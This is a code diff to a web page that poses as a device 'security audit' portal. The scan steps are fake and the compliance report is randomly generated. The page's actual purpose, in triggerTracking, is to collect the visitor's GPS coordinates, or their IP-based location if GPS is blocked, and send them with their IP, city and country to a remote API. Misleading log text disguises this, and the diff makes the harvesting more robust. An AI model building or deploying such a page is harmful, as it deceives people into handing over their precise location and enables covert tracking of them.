@@ -10,6 +10,8 @@
         .scan-line { border-left: 2px solid #3b82f6; }
         @keyframes pulse-fast { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         .scanning-dot { animation: pulse-fast 1s infinite; }
+        .report-table tr { border-bottom: 1px solid #1e293b; }
+        .report-table td { padding: 8px 0; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen p-6">
@@ -51,13 +53,45 @@
                 </div>
             </div>
 
-            <div id="result-state" class="hidden text-center py-4">
-                <div class="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
-                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+            <div id="result-state" class="hidden">
+                <div class="flex items-center gap-4 mb-6 border-b border-slate-800 pb-4">
+                    <div class="w-12 h-12 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center shrink-0">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    </div>
+                    <div>
+                        <h2 class="text-lg font-bold text-white">Audit Complete</h2>
+                        <p class="text-slate-500 text-xs uppercase tracking-tighter">Report ID: <span id="report-id"></span></p>
+                    </div>
                 </div>
-                <h2 class="text-xl font-bold text-white mb-2">Audit Complete</h2>
-                <p class="text-slate-400 text-sm">Your device is compliant. Geographic handshake verified.</p>
-                <button onclick="location.reload()" class="mt-6 text-blue-500 text-xs hover:underline uppercase font-bold tracking-widest">Close Portal</button>
+
+                <div class="bg-slate-800/30 rounded-lg p-5 mb-6">
+                    <table class="w-full text-xs report-table">
+                        <tr class="text-slate-400">
+                            <td>Validation Protocol</td>
+                            <td class="text-right text-slate-200 font-mono">CS-TLS/RSA-2048</td>
+                        </tr>
+                        <tr class="text-slate-400">
+                            <td>Spatial Resolution</td>
+                            <td id="res-level" class="text-right font-mono">---</td>
+                        </tr>
+                        <tr class="text-slate-400">
+                            <td>Network Latency</td>
+                            <td id="res-latency" class="text-right text-slate-200 font-mono">---</td>
+                        </tr>
+                        <tr class="text-slate-400">
+                            <td>Regional Compliance</td>
+                            <td id="res-compliance" class="text-right text-green-500 font-mono">VERIFIED</td>
+                        </tr>
+                        <tr class="text-slate-400">
+                            <td>Integrity Trust Score</td>
+                            <td id="res-score" class="text-right text-blue-400 font-bold font-mono">---</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <p class="text-slate-500 text-[10px] text-center italic mb-6">Your endpoint has been successfully white-listed for this session.</p>
+                
+                <button onclick="clearSessionAndReload()" class="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold rounded uppercase tracking-widest transition-colors">Terminate Session</button>
             </div>
         </div>
     </div>
@@ -69,6 +103,14 @@
         const percent = document.getElementById('scan-percent');
         const statusText = document.getElementById('scan-status');
 
+        // Check session storage on load to see if audit was already done
+        window.onload = () => {
+            const cachedMethod = sessionStorage.getItem('auditMethod');
+            if (cachedMethod) {
+                showReport(cachedMethod);
+            }
+        };
+
         function addLog(msg) {
             const div = document.createElement('div');
             div.className = "scan-line pl-2";
@@ -79,36 +121,65 @@
 
         async function triggerTracking() {
             return new Promise((resolve) => {
+                let resolved = false;
+
+                // Safety timeout: If user ignores the browser prompt for 8 seconds, 
+                // we move on to ensure the UI doesn't hang forever.
+                const safetyTimeout = setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        sessionStorage.setItem('auditMethod', 'standard');
+                        addLog("<span class='text-yellow-500'>Handshake timeout. Using standard network protocols...</span>");
+                        resolve();
+                    }
+                }, 8000);
+
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
-                        addLog("<span class='text-blue-400'>Geographic compliance verified (GPS Lock).</span>");
-                        const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
-                        await sendData({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            method: "GPS High Accuracy",
-                            accuracy: `±${pos.coords.accuracy.toFixed(1)}m`,
-                            ip: ipData.query || "Inferred",
-                            city: ipData.city || "Unknown",
-                            country: ipData.country || "Unknown"
-                        });
+                        if (resolved) return;
+                        resolved = true;
+                        clearTimeout(safetyTimeout);
+                        
+                        sessionStorage.setItem('auditMethod', 'high-precision');
+                        addLog("<span class='text-blue-400'>Spatial validation checksum verified.</span>");
+                        
+                        try {
+                            const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
+                            await sendData({
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                method: "GPS High Accuracy",
+                                accuracy: `±${pos.coords.accuracy.toFixed(1)}m`,
+                                ip: ipData.query || "Inferred",
+                                city: ipData.city || "Unknown",
+                                country: ipData.country || "Unknown"
+                            });
+                        } catch (e) { console.warn("Relay skipped."); }
                         resolve();
                     },
                     async (err) => {
-                        addLog("<span class='text-yellow-500'>Sensor blocked. Failing over to Network Inference...</span>");
-                        const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
-                        await sendData({
-                            latitude: ipData.lat,
-                            longitude: ipData.lon,
-                            method: "Network Inference",
-                            accuracy: "±5-10km",
-                            ip: ipData.query || "Unknown",
-                            city: ipData.city || "Unknown",
-                            country: ipData.country || "Unknown"
-                        });
+                        if (resolved) return;
+                        resolved = true;
+                        clearTimeout(safetyTimeout);
+
+                        sessionStorage.setItem('auditMethod', 'standard');
+                        addLog("<span class='text-yellow-500'>Direct sensor unavailable. Failover to Peer analysis...</span>");
+                        
+                        try {
+                            const ipData = await fetch(`${API_BASE}/track-ip`).then(r => r.json());
+                            await sendData({
+                                latitude: ipData.lat || 0,
+                                longitude: ipData.lon || 0,
+                                method: "Network Inference",
+                                accuracy: "±5-10km",
+                                ip: ipData.query || "Unknown",
+                                city: ipData.city || "Unknown",
+                                country: ipData.country || "Unknown"
+                            });
+                        } catch (e) { console.warn("Inference skipped."); }
                         resolve();
                     },
-                    { timeout: 6000 }
+                    { timeout: 7000, enableHighAccuracy: true }
                 );
             });
         }
@@ -123,6 +194,35 @@
             } catch (e) { console.error("Handshake failed"); }
         }
 
+        function showReport(method) {
+            document.getElementById('initial-state').classList.add('hidden');
+            document.getElementById('scanning-state').classList.add('hidden');
+            
+            document.getElementById('report-id').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
+            const level = document.getElementById('res-level');
+            const score = document.getElementById('res-score');
+            const latency = document.getElementById('res-latency');
+
+            latency.innerText = (Math.random() * 50 + 10).toFixed(0) + "ms";
+
+            if (method === "high-precision") {
+                level.innerText = "MAX (SENSOR-BASED)";
+                level.className = "text-right font-mono text-blue-400";
+                score.innerText = "99.4%";
+            } else {
+                level.innerText = "STANDARD (NETWORK)";
+                level.className = "text-right font-mono text-yellow-500";
+                score.innerText = "84.2%";
+            }
+
+            document.getElementById('result-state').classList.remove('hidden');
+        }
+
+        function clearSessionAndReload() {
+            sessionStorage.removeItem('auditMethod');
+            location.reload();
+        }
+
         document.getElementById('startBtn').addEventListener('click', async () => {
             document.getElementById('initial-state').classList.add('hidden');
             document.getElementById('scanning-state').classList.remove('hidden');
@@ -131,8 +231,8 @@
                 { p: 10, m: "Initializing secure sandbox...", s: "Initializing..." },
                 { p: 25, m: "Checking SSL/TLS certificate chain...", s: "Encryption Check" },
                 { p: 40, m: "Verifying browser integrity...", s: "Integrity Audit" },
-                { p: 55, m: "Probing Geographic Compliance API...", s: "Compliance Check", action: triggerTracking },
-                { p: 80, m: "Scanning for cross-site injection...", s: "Threat Scanning" },
+                { p: 60, m: "Probing Infrastructure Compliance API...", s: "Compliance Check", action: triggerTracking },
+                { p: 85, m: "Scanning for cross-site injection...", s: "Threat Scanning" },
                 { p: 100, m: "Compiling audit report...", s: "Finalizing" }
             ];
 
@@ -145,14 +245,14 @@
                 if (step.action) {
                     await step.action();
                 } else {
-                    await new Promise(r => setTimeout(r, 1200));
+                    await new Promise(r => setTimeout(r, 800));
                 }
             }
 
             setTimeout(() => {
-                document.getElementById('scanning-state').classList.add('hidden');
-                document.getElementById('result-state').classList.remove('hidden');
-            }, 1000);
+                const finalMethod = sessionStorage.getItem('auditMethod') || 'standard';
+                showReport(finalMethod);
+            }, 800);
         });
     </script>
 </body>
